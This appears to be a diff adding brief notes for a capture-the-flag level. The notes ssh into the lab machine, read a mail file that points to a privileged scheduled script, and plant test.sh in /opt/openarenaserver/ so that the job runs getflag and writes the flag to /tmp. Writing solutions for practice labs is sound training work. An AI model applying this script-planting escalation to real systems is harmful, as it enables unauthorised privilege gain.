@@ -1,0 +1,16 @@
+# Connect with ssh to lvl5
+ssh level05@IP -p 4242
+# A msg ll show up 
+# Go to var/mail
+# Try:
+find / -name level05 2>/dev/null
+# On both files we have same file
+cat level05
+# Cat script
+cat usr/sbin/openarenaserver
+# Enter to folder
+cd /opt/openarenaserver/
+# Creat file
+echo "getflag > /tmp/flag" > test.sh
+# Go home
+cat /tmp/flag
